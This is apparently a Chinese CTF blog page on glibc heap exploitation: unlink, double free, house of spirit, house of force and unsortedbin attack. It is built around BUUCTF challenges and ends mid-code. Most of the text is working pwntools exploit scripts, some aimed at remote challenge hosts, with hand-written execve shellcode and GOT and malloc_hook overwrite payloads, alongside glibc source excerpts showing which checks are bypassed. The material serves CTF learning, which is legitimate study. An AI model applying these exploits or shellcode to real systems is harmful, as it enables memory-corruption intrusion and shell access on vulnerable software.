<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26354</span>)</span><br><span class="line">elfp = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(size)</span><br><span class="line">    io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(index)</span><br><span class="line">    io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(index)</span><br><span class="line">    io.sendline(size)</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">num1 = create(<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">num2 = create(<span class="string">b&#x27;280&#x27;</span>)</span><br><span class="line"></span><br><span class="line">num3 = create(<span class="string">b&#x27;280&#x27;</span>)</span><br><span class="line">fd = <span class="number">0x602150</span>-<span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x602150</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;288&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x111</span>)+p64(fd)+p64(bk)+<span class="number">0xf0</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x120</span>))</span><br><span class="line">de(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">putplt = elfp.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">putgot = elfp.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">freeplt = elfp.plt[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">atoiplt = elfp.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">freegot = elfp.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(putgot))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freeplt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoiplt))</span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;112&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(putgot)+p64(freegot)+p64(<span class="number">0x602158</span>)+<span class="number">5</span>*(<span class="string">b&#x27;cat ./flag&#x27;</span>+<span class="number">6</span>*<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,p64(putplt))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">putadd = u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_puts = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">base = putadd - libc_puts</span><br><span class="line">system = base +libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,p64(system))</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#io.sendline(&quot;cat flag&quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recv()</span></span><br></pre></td></tr></table></figure>

<h1 id="double-free"><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h1><p>注意一系列的检查吧，搞笑的是检查size的时候居然只看低4字节，因此可以通过hex表找可以伪造堆块的位置，其余的便没了。基本思想就是可以控制free掉的堆块进而改变fd指针，进而可以malloc的任意位置，以ISCC218–Write Some Paper为例，还有比较重要的是，低版本的堆fasbin没有地址对齐检查，否则就不好利用了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line">io =process(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the index you want to store(0-9):&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;How long you will enter:&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please enter your content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which paper you want to delete,please enter it&#x27;s index(0-9):&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">mallocadd = <span class="number">0x0000000000602032</span></span><br><span class="line">sysadd = <span class="number">0x0000000000400943</span></span><br><span class="line">create(<span class="string">b&#x27;3&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,p64(mallocadd))</span><br><span class="line">create(<span class="string">b&#x27;4&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;5&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;6&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">22</span>*<span class="string">b&#x27;a&#x27;</span>+p64(sysadd))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><blockquote>
<p>以<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a>为例子</p>
</blockquote>
<h2 id="fastbin绕过思路"><a href="#fastbin绕过思路" class="headerlink" title="fastbin绕过思路"></a>fastbin绕过思路</h2><ul>
<li>chunk地址对齐，此题对应的libc貌似不用考虑，没有试过。</li>
<li>size对齐（一般以2*size_t）</li>
<li>next_size检查，本题目主要检查尺寸范围</li>
<li>具体libc具体分析，可以查看malloc.c的源码</li>
</ul>
<blockquote>
<p>此处以glibc2.35为例</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim))) <span class="comment">//地址对齐检查，低版本好像没有</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);<span class="comment">//chunksize检查</span></span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);<span class="comment">//debug模式调试所用，不用关心</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">			malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="本题思路"><a href="#本题思路" class="headerlink" title="本题思路"></a>本题思路</h2><blockquote>
<p>1.利用printf的基址泄露rbp的值。</p>
<p>2.利用栈溢出来覆盖ptr的值（覆盖为rbp相关），可以利用此条件构造一个malloc_chunk（大尺寸），然后free掉再malloc达到可以更改rbp所指向的位置附近的值。而又因为rbp的bp-chain的性质，即可更改返回地址。</p>
<p>3.将返回地址更改为步骤2注入的shellcode的地址。因为步骤2可利用的空间有限，shellcode手写较好，不宜过长。</p>
<p>4.其中还有一些细节，如利用id来构造下一个chunk的size字段，绕过检查。</p>
</blockquote>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io= process(&quot;./pwn200&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27077</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">## 泄露地址</span></span><br><span class="line">io.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="number">48</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">rbp = u64(io.recvuntil(<span class="string">b&quot;,&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp con:&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">## 构造id字段，利用atoi，33会被转化为0x21</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 手写shellcode，push，pop所占机器码较少</span></span><br><span class="line">binpa = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm len:&quot;</span>,<span class="built_in">len</span>(binpa))</span><br><span class="line"><span class="comment">##溢出字段的构造</span></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">b&#x27;\x00&#x27;</span>+binpa+<span class="number">4</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x41</span>)+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>+<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how long?\n&quot;</span>,<span class="string">b&#x27;56&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-spirit（Arbitrary-Alloc）"><a href="#house-of-spirit（Arbitrary-Alloc）" class="headerlink" title="house_of_spirit（Arbitrary Alloc）"></a>house_of_spirit（<strong>Arbitrary Alloc</strong>）</h1><blockquote>
<p>以<a href="https://buuoj.cn/challenges#babyheap_0ctf_2017">BUUCTF在线评测 (buuoj.cn)</a>为例</p>
</blockquote>
<h2 id="本题思路-1"><a href="#本题思路-1" class="headerlink" title="本题思路"></a>本题思路</h2><ul>
<li>通过unsortedbin的双向链表泄露main_arena地址，得到libc基址，再通过将malloc_hook中注入onegadget拿到shell</li>
<li>此题有明显溢出，因此可以考虑吧overslap，凭着这个思路可以泄露address</li>
<li>通过复写fd，来达到任意地址写的目的，以此来注入onegadget</li>
</ul>
<h2 id="本题py-远程打不通，可以打通本地，搞不懂为什么"><a href="#本题py-远程打不通，可以打通本地，搞不懂为什么" class="headerlink" title="本题py(远程打不通，可以打通本地，搞不懂为什么)"></a>本题py(远程打不通，可以打通本地，搞不懂为什么)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io= process(&quot;./pwn200&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27077</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="number">48</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">rbp = u64(io.recvuntil(<span class="string">b&quot;,&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp con:&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binpa = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm len:&quot;</span>,<span class="built_in">len</span>(binpa))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 8*b&#x27;\x00&#x27;+binpa+3*b&#x27;\x00&#x27;+p64(0x11)+0x8*b&#x27;a&#x27;+p64(0x21)+p64(rbp-144)</span></span><br><span class="line"><span class="comment">#payload =  8*b&#x27;\x00&#x27;+p64(0x21)+binpa+3*b&#x27;\x00&#x27;+p64(0x21)+0x8*b&#x27;a&#x27;+p64(rbp-176)</span></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">b&#x27;\x00&#x27;</span>+binpa+<span class="number">4</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x41</span>)+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>+<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how long?\n&quot;</span>,<span class="string">b&#x27;56&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h1><blockquote>
<p>修改top的size字段使其极大，以至于达到可以任意地址分配的目的。</p>
<p>第一次分配先改变top的区域</p>
<p>第二次分配直接获得想要区域的读写权限</p>
</blockquote>
<h2 id="部分代码如下："><a href="#部分代码如下：" class="headerlink" title="部分代码如下："></a>部分代码如下：</h2><blockquote>
<p>此代码为高版本的malloc源码，低版本无：<code> if (__glibc_unlikely (size &gt; av-&gt;system_mem))</code>此判断语句，因此可以利用成功。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="demo："><a href="#demo：" class="headerlink" title="demo："></a>demo：</h2><blockquote>
<p>版本glibc2.23，高版本只要加了patch很容易使此攻击失效</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,ptr2;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    ptr = (<span class="type">long</span>*)((<span class="type">long</span>)(ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">-4120</span>);</span><br><span class="line">    <span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是<code>remainder = chunk_at_offset (victim, nb);</code>语句来改变top的指针指向，改编为victim+nb</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<p>因此可以看出当malloc（负数）的时候，会将top的指针降低到bss段，以此来达到复写bss段的目的。</p>
<figure class="highlight plaintext"><figcaption><span>*p4 </span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 习题：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#hitcontraining_bamboobox)</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./bamboobox&quot;)</span><br><span class="line">#io = remote(&quot;node5.buuoj.cn&quot;,28639)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">def create(size,content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;,b&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">    io.sendafter(&quot;Please enter the name of item:&quot;,content)</span><br><span class="line">def show():</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;1&#x27;)</span><br><span class="line">    return io.recvuntil(&quot;\n&quot;).strip()</span><br><span class="line">def change(index,size,content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">    io.sendafter(&quot;Please enter the new name of the item:&quot;,content)</span><br><span class="line">def remove(index):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">def exit():</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;5&#x27;)</span><br><span class="line">create(b&#x27;248&#x27;,24*b&#x27;a&#x27;)</span><br><span class="line">change(b&#x27;0&#x27;,b&#x27;256&#x27;,248*b&#x27;a&#x27;+p64(0xffffffffffffffff))</span><br><span class="line">create(b&#x27;-304&#x27;,8*b&#x27;a&#x27;)</span><br><span class="line">create(b&#x27;24&#x27;,8*b&#x27;a&#x27;+p64(0x0000000000400D49))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">exit()</span><br><span class="line">print(io.recv())</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这道题漏洞很多，这个方法需要flag在正确路径，但是buu远程好像不在，因此需要换一种方法。</p>
<h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin_attack"></a>unsortedbin_attack</h1><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>在malloc一个大块时，若unsortedbin中只有一个remindered块，那么就会进行脱链，传递给用户，当然尺寸得足够。</p>
<p>其中会执行<code>bck = victim-&gt;bk;..............;bck-&gt;fd = unsorted_chunks (av);</code>利用此可将bck+0x10所指向的位置的值变得极大。</p>
<p>但是在libc2.35中有指针检查，因此此利用方法在高版本应该会失效。具体patch为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="comment">/*此处代码检查了bk指针的伪造，有效防止了此漏洞*/</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span 